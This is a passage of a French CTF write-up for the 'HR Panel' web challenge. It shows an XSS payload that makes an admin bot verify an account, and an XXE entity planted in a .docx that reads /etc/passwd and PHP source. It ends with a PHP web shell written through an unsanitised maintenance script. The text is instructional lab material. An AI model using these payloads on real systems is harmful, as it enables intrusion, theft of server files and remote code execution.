p2Y20wdFpHRjBZU0krQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1BHbHVjSFYwSUc1aGJXVTlJblZ6WlhKdVlXMWxJaUJ3YkdGalpXaHZiR1JsY2owaVdqRXROVEkyTFUxUklpQnphWHBsUFNJeU1DSWdjbVZ4ZFdseVpXUStQR0p5UGdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEeGlkWFIwYjI0Z2RIbHdaVDBpYzNWaWJXbDBJaUJqYkdGemN6MGlZblJ1SUdKMGJpMXdjbWx0WVhKNUlqNVdaWEpwWm5rZ2RHaHBjeUJoWTJOdmRXNTBQQzlpZFhSMGIyNCtDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThMMlp2Y20wK0NpQWdJQ0FnSUNBZ0lDQWdJRHd2WkdsMlBnb2dJQ0FnSUNBZ0lEd3ZaR2wyUGdvZ0lDQWdQQzlrYVhZK0Nqd3ZaR2wyUGdvOFpHbDJJR05zWVhOelBTSm1hWGhsWkMxaWIzUjBiMjBnZEdWNGRDMWpaVzUwWlhJaVBnb2dJQ0FnSUNBOGNDQnpkSGxzWlQwaVkyOXNiM0k2SUNNMU1qbGlZekE3SWo1SmJuUmxjaUJKVlZRZ1NGSWdVMlZ5ZG1salpYTWdWakV1TVMwNFBDOXdQZ284TDJScGRqNEtQQzlpYjJSNVBnbzhMMmgwYld3Kw====
</pre>
</details>
<details>
  <summary>Page /admin/users</summary>
  
```html
<!DOCTYPE HTML>
<head>
    <title>Inter IUT - Human Resources</title>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
<body><link rel="stylesheet" href="/assets/css/form.css">
<nav class="navbar navbar-expand-lg navbar-light bg-ligh">
  <a class="navbar-brand" href="/">
    <img src="/assets/Images/logo.png" width="45" height="40" class="d-inline-block align-top" alt="">
    Inter IUT
  </a>
  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
    <div class="navbar-nav">
        <a class="nav-item nav-link" href="/">Home</a>
        <a class="nav-item nav-link active" href="/admin/users">Admin <span class="sr-only">(current)</span></a>        <a class="nav-item nav-link" href="/services">Services</a>
        <a class="nav-item nav-link" href="/contact">Contact</a>
        <a class="nav-item nav-link" href="/me">My account</a>  
        <a class="nav-item nav-link" href="/logout">Logout</a>
    </div>
  </div>
</nav>
<div class="container">
    <div class="row">
        <div class="col text-center">
            <div id="form"> 
                <p class="lead" style="color: #529bc0;">Welcome Admin ! You can fill out the form below to verify a user's account.</p>
                                <form method="POST" enctype="multipart/form-data">
                    <input name="username" placeholder="Z1-526-MQ" size="20" required><br>
                    <button type="submit" class="btn btn-primary">Verify this account</button>
                </form>
            </div>
        </div>
    </div>
</div>
<div class="fixed-bottom text-center">
      <p style="color: #529bc0;">Inter IUT HR Services V1.1-8</p>
</div>
</body>
</html>
```
</details>

***

Sur la page reçue on observe quelque chose de très intéressant : Un joli formulaire qui a tout l'air de nous permettre d'être vérifié et donc d'accéder possiblement à de nouvelles fonctionnalités
```html
<p class="lead" style="color: #529bc0;">Welcome Admin ! You can fill out the form below to verify a user's account.</p>
<form method="POST" enctype="multipart/form-data">
	<input name="username" placeholder="Z1-526-MQ" size="20" required><br>
	<button type="submit" class="btn btn-primary">Verify this account</button>
</form>
```
On va donc forcer le bot à réaliser ce formulaire et envoyer ce formulaire de la même manière que précédemment en spécifiant notre propre *username* avec la payload suivante :
```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('POST','/admin/users',false);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send("username=A5-596-LZ");
</script>
```

Après quelques secondes, nous pouvons cliquer sur la page services qui met à disposition 3 nouvelles fonctionnalités :

* Access my pay slips (Permet d'acceder à ses fiches de payes)
* Manage my vacations (Permet de planifier des jours de congés)
* Create HR requests (Permet de signaler un problème avec comme complément un .docx détaillant le problème)

La mention BETA VERSION sur la dernière fonctionnalité indique la voie à prendre.

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/7bc045cf92370f097c422e65e143bbde357a953d/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/account_validated.gif" />
</p>


Après quelques tentatives infructueuses de bypass les filtres sur l'upload du fichier .docx dans le but d'y envoyer un reverse shell en PHP, on décide de simplement envoyer un .docx et de voir ce qui se passe. N'ayant pas de .docx sous la main on peut rapidement en générer un grace à python et la lib docx nativement intégrer : 
```python
from docx import Document
doc = Document()
content = doc.add_paragraph("Je m'appelle Alex Winchest et j'adore jouer à cache-cache")
doc.save("resume.docx")
```

On rédige et en envoie le document dans le formulaire, puis une fois envoyé, on constate que le backend parse notre resume.docx afin d'y afficher son contenu :

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/7bc045cf92370f097c422e65e143bbde357a953d/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/test_hr.gif" />
</p>

## Étape 3 : Exploitation d'une Local File Inclusion (LFI) grâce à une XML External Entity attack (XEE) dans le .docx

Après une rapide recherche on s'aperçoit qu'il est possible de glisser une XXE dans le resume.docx. En effet les fichiers .docx ne sont que des archives contenant principalement des fichiers .xml. On peut donc unzip le .docx et aller modifier le contenu se situant dans /word/document.xml

Le but ici est d'ajouter un entête qui va être exécuté par le backend (en l'occurrence ici on testera une LFI sur le fichier /etc/passwd afin de voir si cela fonctionne) et d'y incorporer le résultat à la place de notre paragraphe.

Dans un premier temps il faut extraire les fichiers .xml zippé à l'intérieur du .docx :
<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/7bc045cf92370f097c422e65e143bbde357a953d/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/unzipDOCX.png" />
</p>


Puis on édite /word/document.xml comme suit : en dessous de la première ligne il faut insérer la ligne suivante :
```xml
<!DOCTYPE test [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
```
<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/7bc045cf92370f097c422e65e143bbde357a953d/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/afteredit1.png" />
</p>

Pour récupérer le résultat de l'exécution, on change le contenu de notre paragraphe par 
<pre>&test;</pre>

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/7bc045cf92370f097c422e65e143bbde357a953d/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/afteredit2.png" />
</p>

Pour terminer on re-zip le tout :

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/7bc045cf92370f097c422e65e143bbde357a953d/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/rezip.png" />
</p>

On peut maintenant envoyer notre formulaire :

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/7bc045cf92370f097c422e65e143bbde357a953d/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/lfi_passwd.gif" />
</p>


Et ....... BINGO, nous avons une magnifique LFI. Mais maintenant que faire avec elle ? Et bien rappelons-nous nous qu'il y avait une fichier .htaccess dans le robots.txt, alors tentons de le récupérer. Il est commun de retrouver ce fichier dans l'arborescence /var/www/html, on replacera donc  notre payload dans resume.docx par la suivante :

```xml
<!DOCTYPE test [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/html/.htaccess'>]>
```
*Vous noterez que j'ai utilisé un wrapper php ici, en fait on peut toujours utiliser file:/// c'est juste que je n'ai pas gaffe lors du writeup, dans tous les cas on en aura besoin par la suite)*


<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/7bc045cf92370f097c422e65e143bbde357a953d/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/lfi_htaccess.gif" />
</p>


Et ....... BINGO, on peut maintenant décoder et récupérer le contenu de ce fichier .htaccess (qui sans grande surprise contient le routage des urls) : 

***
<details>
<summary>Contenu .htaccess encodé en base64</summary>
<pre>
T3B0aW9ucyAtSW5kZXhlcwpFcnJvckRvY3VtZW50IDQwNCAvNDA0LnBocApFcnJvckRvY3VtZW50IDQwMyAvNDAzLnBocApSZXdyaXRlRW5naW5lIG9uClJld3JpdGVCYXNlIC8KUmV3cml0ZVJ1bGUgXnJlZ2lzdGVyJCAvY29yZS9yZWdpc3Rlci5waHAKUmV3cml0ZVJ1bGUgXmxvZ291dCQgL2NvcmUvbG9nb3V0LnBocApSZXdyaXRlUnVsZSBebWUkIC9jb3JlL2FjY291bnQucGhwClJld3JpdGVSdWxlIF5jb250YWN0JCAvY29yZS9jb250YWN0LnBocApSZXdyaXRlUnVsZSBebG9nJCAvY29yZS9sb2dpbi5waHAKUmV3cml0ZVJ1bGUgXmRlbGV0ZSQgL2NvcmUvZGVsZXRlLnBocApSZXdyaXRlUnVsZSBec2VydmljZXMkIC9jb3JlL3NlcnZpY2VzLnBocApSZXdyaXRlUnVsZSBec2VydmljZXMvc2xpcHMkIC9jb3JlL3NlcnZpY2VzL3NsaXBzLnBocApSZXdyaXRlUnVsZSBec2VydmljZXMvdmFjYXRpb25zJCAvY29yZS9zZXJ2aWNlcy92YWNhdGlvbnMucGhwClJld3JpdGVSdWxlIF5zZXJ2aWNlcy9yZXF1ZXN0cyQgL2NvcmUvc2VydmljZXMvcmVxdWVzdHMucGhwClJld3JpdGVSdWxlIF5hZG1pbi91c2VycyQgL2NvcmUvYWRtaW4vdXNlcnMucGhwClJld3JpdGVSdWxlIF5hZG1pbi9ub3J6aF9tYW5hZ2VtZW50JCAvY29yZS9hZG1pbi9pbnRlcml1dF9pbnRlcm5hbF9tYW5hZ2UucGhwCg====
</pre>
</details>
<details>
  <summary>Contenu .htaccess</summary>
  
<pre>
Options -Indexes
ErrorDocument 404 /404.php
ErrorDocument 403 /403.php
RewriteEngine on
RewriteBase /
RewriteRule ^register$ /core/register.php
RewriteRule ^logout$ /core/logout.php
RewriteRule ^me$ /core/account.php
RewriteRule ^contact$ /core/contact.php
RewriteRule ^log$ /core/login.php
RewriteRule ^delete$ /core/delete.php
RewriteRule ^services$ /core/services.php
RewriteRule ^services/slips$ /core/services/slips.php
RewriteRule ^services/vacations$ /core/services/vacations.php
RewriteRule ^services/requests$ /core/services/requests.php
RewriteRule ^admin/users$ /core/admin/users.php
RewriteRule ^admin/norzh_management$ /core/admin/interiut_internal_manage.php
</pre>
</details>

***

La dernière route, jusqu'ici inconnue est intrigante : "admin/norzh_management", en tentant d'y accéder directement depuis le naviguateur on s'aperçoit qu'il s'agit d'une ressource uniquement accessible en interne : 

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/7bc045cf92370f097c422e65e143bbde357a953d/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/adminforbidden.png" />
</p>

Ça tombe bien car nous aussi on est à l'intérieur, alors récupérons ce fichier grâce à notre LFI sur le .docx :

```xml
<!DOCTYPE test [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/html/core/admin/interiut_internal_manage.php'>]>
```
<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/7bc045cf92370f097c422e65e143bbde357a953d/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/lfi_admin.gif" />
</p>

Et une fois de plus c'est le jackpot : 

***
<details>
<summary>Contenu interiut_internal_manage.php encodé en base64</summary>
<pre>
PD9waHAKLy9DVEZJVVR7OGJiODQ4OTE4OTdkN2VlYTUyNDRkZGJiMTY2MmQwZGVmNmMzMDUwMWMzODI2OWRiMDQ4M2Q4OTJjODBkYWRjZX0Kc2Vzc2lvbl9zdGFydCgpOwoKaWYoIWlzc2V0KCRfU0VTU0lPTlsiZW1haWwiXSkpewogICAgaGVhZGVyKCJMb2NhdGlvbjogLyIpOwogICAgZGllKCk7Cn0KcmVxdWlyZV9vbmNlKCIuLi8uLi9jb3JlL2RhdGFiYXNlX2Nvbm5lY3QucGhwIik7CiRkYiA9IFNxbENvbm5lY3Rpb246OmdldENvbm5lY3Rpb24oKTsKJHN0aCA9ICRkYi0+cHJlcGFyZSgiU0VMRUNUICogRlJPTSB1c2VycyBXSEVSRSBlbWFpbCA9IDplbWFpbCIpOwokc3RoLT5iaW5kVmFsdWUoIjplbWFpbCIsJF9TRVNTSU9OWyJlbWFpbCJdKTsKJHN0aC0+ZXhlY3V0ZSgpOwokcmVzdWx0ID0gJHN0aC0+ZmV0Y2hBbGwoKTsKCi8vaGVhZGVyCmluY2x1ZGUoIi4uLy4uL3RlbXBsYXRlcy9oZWFkZXIucGhwIik7Cj8+CjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iL2Fzc2V0cy9jc3MvZm9ybS5jc3MiPgo8bmF2IGNsYXNzPSJuYXZiYXIgbmF2YmFyLWV4cGFuZC1sZyBuYXZiYXItbGlnaHQgYmctbGlnaCI+CiAgPGEgY2xhc3M9Im5hdmJhci1icmFuZCIgaHJlZj0iLyI+CiAgICA8aW1nIHNyYz0iL2Fzc2V0cy9JbWFnZXMvbG9nby5wbmciIHdpZHRoPSI0NSIgaGVpZ2h0PSI0MCIgY2xhc3M9ImQtaW5saW5lLWJsb2NrIGFsaWduLXRvcCIgYWx0PSIiPgogICAgSW50ZXIgSVVUCiAgPC9hPgogIDxkaXYgY2xhc3M9ImNvbGxhcHNlIG5hdmJhci1jb2xsYXBzZSIgaWQ9Im5hdmJhck5hdkFsdE1hcmt1cCI+CiAgICA8ZGl2IGNsYXNzPSJuYXZiYXItbmF2Ij4KICAgICAgICA8YSBjbGFzcz0ibmF2LWl0ZW0gbmF2LWxpbmsiIGhyZWY9Ii8iPkhvbWU8L2E+CiAgICAgICAgPD9waHAgaWYoJHJlc3VsdFswXVsiaXNBZG1pbiJdID09PSAiMSIpeyA/PjxhIGNsYXNzPSJuYXYtaXRlbSBuYXYtbGluayBhY3RpdmUiIGhyZWY9Ii9hZG1pbi91c2VycyI+QWRtaW4gPHNwYW4gY2xhc3M9InNyLW9ubHkiPihjdXJyZW50KTwvc3Bhbj48L2E+PD9waHAgfSA/PgogICAgICAgIDxhIGNsYXNzPSJuYXYtaXRlbSBuYXYtbGluayIgaHJlZj0iL3NlcnZpY2VzIj5TZXJ2aWNlczwvYT4KICAgICAgICA8YSBjbGFzcz0ibmF2LWl0ZW0gbmF2LWxpbmsiIGhyZWY9Ii9jb250YWN0Ij5Db250YWN0PC9hPgogICAgICAgIDxhIGNsYXNzPSJuYXYtaXRlbSBuYXYtbGluayIgaHJlZj0iL21lIj5NeSBhY2NvdW50PC9hPiAgCiAgICAgICAgPGEgY2xhc3M9Im5hdi1pdGVtIG5hdi1saW5rIiBocmVmPSIvbG9nb3V0Ij5Mb2dvdXQ8L2E+CiAgICA8L2Rpdj4KICA8L2Rpdj4KPC9uYXY+Cjw/cGhwIGlmKCRfU0VSVkVSWyJSRU1PVEVfQUREUiJdID09PSAiMTI3LjAuMC4xIil7ID8+CiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbCB0ZXh0LWNlbnRlciI+CiAgICAgICAgICAgICAgICA8cCBjbGFzcz0ibGVhZCIgc3R5bGU9ImNvbG9yOiAjNTI5YmMwOyI+QXBwbGljYXRpb24gbWFuYWdlbWVudCBzZXJ2aWNlLiBTdGF0dXMgb2Ygc2VydmljZXM6PC9wPgogICAgICAgICAgICAgICAgPHRhYmxlIGNsYXNzPSJ0YWJsZSI+CiAgICAgICAgICAgICAgICAgICAgPHRoZWFkPgogICAgICAgICAgICAgICAgICAgICAgICA8dHI+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0aCBzY29wZT0iY29sIj4jPC90aD4KICAgICAgICAgICAgICAgICAgICAgICAgPHRoIHNjb3BlPSJjb2wiPlNlcnZpY2U8L3RoPgogICAgICAgICAgICAgICAgICAgICAgICA8dGggc2NvcGU9ImNvbCI+U3RhdGU8L3RoPgogICAgICAgICAgICAgICAgICAgICAgICA8L3RyPgogICAgICAgICAgICAgICAgICAgIDwvdGhlYWQ+CiAgICAgICAgICAgICAgICAgICAgPHRib2R5PgogICAgICAgICAgICAgICAgICAgICAgICA8dHI+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0aCBzY29wZT0icm93Ij4xPC90aD4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxhIHRhcmdldD0iX2JsYW5rIiBocmVmPSIvY29udGFjdCI+Q29udGFjdCBwYWdlPC9hPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD5SdW5uaW5nPC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPC90cj4KICAgICAgICAgICAgICAgICAgICAgICAgPHRyPgogICAgICAgICAgICAgICAgICAgICAgICA8dGggc2NvcGU9InJvdyI+MjwvdGg+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iL3NlcnZpY2VzL3ZhY2F0aW9ucyI+VmFjYXRpb25zPC9hPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD5SdW5uaW5nPC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPC90cj4KICAgICAgICAgICAgICAgICAgICAgICAgPHRyPgogICAgICAgICAgICAgICAgICAgICAgICA8dGggc2NvcGU9InJvdyI+MzwvdGg+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iL3NlcnZpY2VzL3NsaXBzIj5TbGlwcyB2aWV3ZXI8L2E+PC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPlJ1bm5pbmc8L3RkPgogICAgICAgICAgICAgICAgICAgICAgICA8L3RyPgogICAgICAgICAgICAgICAgICAgICAgICA8dHI+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0aCBzY29wZT0icm93Ij40PC90aD4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPjxhIHRhcmdldD0iX2JsYW5rIiBocmVmPSIvc2VydmljZXMvcmVxdWVzdHMiPkhSIFJlcXVlc3RzPC9hPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD5SdW5uaW5nPC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPC90cj4KICAgICAgICAgICAgICAgICAgICAgICAgPHRyPgogICAgICAgICAgICAgICAgICAgICAgICA8dGggc2NvcGU9InJvdyI+NTwvdGg+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iL2FkbWluL3VzZXJzIj5BY2NvdW50IFZlcmlmaWNhdGlvbiBTZXJ2aWNlPC9hPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD5SdW5uaW5nPC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPC90cj4KICAgICAgICAgICAgICAgICAgICAgICAgPHRyPgogICAgICAgICAgICAgICAgICAgICAgICA8dGggc2NvcGU9InJvdyI+NjwvdGg+CiAgICAgICAgICAgICAgICAgICAgICAgIDwhLS0gPHRkPjxhIHRhcmdldD0iX2JsYW5rIiBocmVmPSIvbWFpbnRlbmFuY2Uvc2NyaXB0cy94Q0Y4UGQzODJRcDN6T1pUYVM3SC5waHAiPkFkZGluZyBwYWdlcyBzZXJ2aWNlPC9hPjwvdGQ+IC0tPgoJCQk8IS0tIE5vdGU6IHRoZSBwaHAgc2NyaXB0IG5hbWUgaGFzIGJlZW4gY2hhbmdlZCB0byBhdm9pZCBicnV0ZWZvcmNlIC0tPgogICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PGEgaHJlZj0iIyIgb25jbGljaz0iYWxlcnQoJ1RoaXMgc2VydmljZSBpcyBjdXJyZW50bHkgdW5hdmFpbGFibGUgdG8geW91LicpOyI+QWRkaW5nIHBhZ2VzIHNlcnZpY2U8L2E+PC90ZD4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkPkluIG1haW50ZW5hbmNlIGR1ZSB0byBzZWN1cml0eSBicmVhY2hlczwvdGQ+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgICAgICAgICAgPC90Ym9keT4KICAgICAgICAgICAgICAgIDwvdGFibGU+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgPC9kaXY+Cjw/cGhwIH1lbHNleyA/PgogICAgPGRpdiBjbGFzcz0id3JhcHBlciBmYWRlSW5Eb3duIj4KICAgICAgICA8cCBjbGFzcz0ibGVhZCIgc3R5bGU9ImNvbG9yOiByZWQ7Ij5BY2Nlc3MgZm9yYmlkZGVuLiBUaGlzIHBhcnQgY2FuIG9ubHkgYmUgYWNjZXNzZWQgZnJvbSB0aGUgaW50ZXJuYWwgbmV0d29yay48L3A+CiAgICAgICAgPGltZyBzcmM9Ii9hc3NldHMvSW1hZ2VzL2xvZ28ucG5nIiB3aWR0aD0iMTAwIiBoZWlnaHQ9Ijg4Ij4KICAgIDwvZGl2Pgo8P3BocCB9IGluY2x1ZGUoIi4uLy4uL3RlbXBsYXRlcy9mb290ZXIucGhwIik7ID8+Cg==
</pre>
</details>
<details>
  <summary>Page interiut_internal_manage.php</summary>
  
```php
<?php
//CTFIUT{8bb84891897d7eea5244ddbb1662d0def6c30501c38269db0483d892c80dadce}
session_start();

if(!isset($_SESSION["email"])){
    header("Location: /");
    die();
}
require_once("../../core/database_connect.php");
$db = SqlConnection::getConnection();
$sth = $db->prepare("SELECT * FROM users WHERE email = :email");
$sth->bindValue(":email",$_SESSION["email"]);
$sth->execute();
$result = $sth->fetchAll();

//header
include("../../templates/header.php");
?>
<link rel="stylesheet" href="/assets/css/form.css">
<nav class="navbar navbar-expand-lg navbar-light bg-ligh">
  <a class="navbar-brand" href="/">
    <img src="/assets/Images/logo.png" width="45" height="40" class="d-inline-block align-top" alt="">
    Inter IUT
  </a>
  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
    <div class="navbar-nav">
        <a class="nav-item nav-link" href="/">Home</a>
        <?php if($result[0]["isAdmin"] === "1"){ ?><a class="nav-item nav-link active" href="/admin/users">Admin <span class="sr-only">(current)</span></a><?php } ?>
        <a class="nav-item nav-link" href="/services">Services</a>
        <a class="nav-item nav-link" href="/contact">Contact</a>
        <a class="nav-item nav-link" href="/me">My account</a>  
        <a class="nav-item nav-link" href="/logout">Logout</a>
    </div>
  </div>
</nav>
<?php if($_SERVER["REMOTE_ADDR"] === "127.0.0.1"){ ?>
    <div class="container">
        <div class="row">
            <div class="col text-center">
                <p class="lead" style="color: #529bc0;">Application management service. Status of services:</p>
                <table class="table">
                    <thead>
                        <tr>
                        <th scope="col">#</th>
                        <th scope="col">Service</th>
                        <th scope="col">State</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                        <th scope="row">1</th>
                        <td><a target="_blank" href="/contact">Contact page</a></td>
                        <td>Running</td>
                        </tr>
                        <tr>
                        <th scope="row">2</th>
                        <td><a target="_blank" href="/services/vacations">Vacations</a></td>
                        <td>Running</td>
                        </tr>
                        <tr>
                        <th scope="row">3</th>
                        <td><a target="_blank" href="/services/slips">Slips viewer</a></td>
                        <td>Running</td>
                        </tr>
                        <tr>
                        <th scope="row">4</th>
                        <td><a target="_blank" href="/services/requests">HR Requests</a></td>
                        <td>Running</td>
                        </tr>
                        <tr>
                        <th scope="row">5</th>
                        <td><a target="_blank" href="/admin/users">Account Verification Service</a></td>
                        <td>Running</td>
                        </tr>
                        <tr>
                        <th scope="row">6</th>
                        <!-- <td><a target="_blank" href="/maintenance/scripts/xCF8Pd382Qp3zOZTaS7H.php">Adding pages service</a></td> -->
			<!-- Note: the php script name has been changed to avoid bruteforce -->
                        <td><a href="#" onclick="alert('This service is currently unavailable to you.');">Adding pages service</a></td>
                        <td>In maintenance due to security breaches</td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
<?php }else{ ?>
    <div class="wrapper fadeInDown">
        <p class="lead" style="color: red;">Access forbidden. This part can only be accessed from the internal network.</p>
        <img src="/assets/Images/logo.png" width="100" height="88">
    </div>
<?php } include("../../templates/footer.php"); ?>

```
</details>

***

Comme vous pouvez le constater, nous observons une ligne intéressante en haut de la page : 
```php 
//CTFIUT{8bb84891897d7eea5244ddbb1662d0def6c30501c38269db0483d892c80dadce}
```
<p align="center">
  <br/>
  <b>FLAG 2 : CTFIUT{8bb84891897d7eea5244ddbb1662d0def6c30501c38269db0483d892c80dadce}</b>
</p>
<br/><br/>  
  
# HR-Panel 3 - 150pts

Au delà du flag, ce fichier contient des informations intéressantes dont deux commentaires pour le moins intriguants :
```html
<!-- <td><a target="_blank" href="/maintenance/scripts/xCF8Pd382Qp3zOZTaS7H.php">Adding pages service</a></td> -->
<!-- Note: the php script name has been changed to avoid bruteforce -->
```

Lorsque que l'on y accède directement , la page semble exister mais n'affiche rien :

<p align="center">
  <img src="https://github.com/Endeavxor/CTF-Writeups/blob/7bc045cf92370f097c422e65e143bbde357a953d/2021/CTF%20Inter%20IUT/Web/HR%20Panel/img/accessible.png" />
</p>


Tentons donc d'y récupérer son contenu afin de voir ce qui se cache derrière. Pour cela même principe qu'avant on se sert de notre LFI :

```xml
<!DOCTYPE test [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/html/maintenance/scripts/xCF8Pd382Qp3zOZTaS7H.php'>]>
```

***
<details>
<summary>Contenu xCF8Pd382Qp3zOZTaS7H.php encodé en base64</summary>
<pre>
PD9waHAKLyoKVE9ETzoKSXQgaXMgbmVjZXNzYXJ5IHRvIGZpeCB0aGUgcHJvYmxlbSB3aGVuIGFkZGluZyBhIHBhZ2UsIHRvIHByZXZlbnQgcGhwIGZ1bmN0aW9ucyB0byBiZSBjYWxsZWQuIApTb21lIG9mIHRoZW0gYXJlIGRpc2FibGVkIGluIC9ldGMvcGhwLzcuNC9hcGFjaGUyL3BocC5pbmksIGJ1dCBhZnRlciBhbiBpbnRlcm5hbCBwZW50ZXN0LCB0aGV5IHN0aWxsIG1hbmFnZWQgdG8gZXhlY3V0ZSBzb21lIGNvZGUuCiovCmlmKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAiR0VUIil7CiAgICBpZihpc3NldCgkX0dFVFsicGFnZUNvbnRlbnQiXSkgJiYgaXNzZXQoJF9HRVRbInBhZ2VOYW1lIl0pKXsgLy8gTXVzdCBiZSBhICRfR0VUIGhlcmUgYmVjYXVzZSB0aGVyZSBpcyBubyBpbnRlcmZhY2UgZm9yIHRoaXMgcGFnZS4KICAgICAgICAkZiA9IGZvcGVuKCIvdmFyL3d3dy9odG1sL21haW50ZW5hbmNlL3RlbXBsYXRpbmdfcGFnZXMvIi5zdHJfcmVwbGFjZSgiLiIsIiIsJF9HRVRbInBhZ2VOYW1lIl0pLiIucGhwIiwiYSsiKTsKICAgICAgICBmd3JpdGUoJGYsJF9HRVRbInBhZ2VDb250ZW50Il0pOwogICAgICAgIGZjbG9zZSgkZik7CiAgICAgICAgZWNobygiUGFnZSB1cGxvYWRlZCB0byAvbWFpbnRlbmFuY2UvdGVtcGxhdGluZ19wYWdlcy8iLnN0cl9yZXBsYWNlKCIuIiwiIiwkX0dFVFsicGFnZU5hbWUiXSkuIi5waHAiKTsKICAgIH0KfQo/Pg==
</pre>
</details>
<details>
  <summary>Page xCF8Pd382Qp3zOZTaS7H.php</summary>
  
```php
<?php
/*
TODO:
It is necessary to fix the problem when adding a page, to prevent php functions to be called. 
Some of them are disabled in /etc/php/7.4/apache2/php.ini, but after an internal pentest, they still managed to execute some code.
*/
if($_SERVER['REQUEST_METHOD'] === "GET"){
    if(isset($_GET["pageContent"]) && isset($_GET["pageName"])){ // Must be a $_GET here because there is no interface for this page.
        $f = fopen("/var/www/html/maintenance/templating_pages/".str_replace(".","",$_GET["pageName"]).".php","a+");
        fwrite($f,$_GET["pageContent"]);
        fclose($f);
        echo("Page uploaded to /maintenance/templating_pages/".str_replace(".","",$_GET["pageName"]).".php");
    }
}
?>
```
</details>

***

## Étape 4 : Remote Code Execution (RCE)

Le contenu est simple et son utilisation est flagrante : En envoyant deux paramètres pageName et pageContent en GET, le backend nous créer un fichier de nom pageName et contenant ce qui sera dans le paramètre pageContent.

On essaye donc dans un premier temps d'avoir le contenu suivant dans le fichier php afin de pouvoir exécuter ce qui sera dans le paramètre cmd:
```javascript
http://hr-panel.interiut.ctf/maintenance/scripts/xCF8Pd382Qp3zOZTaS7H.php?pageName=a&pageContent=<?php echo system($_GET["cmd"]); ?>
```

La page est bien upload :
<p align="center">
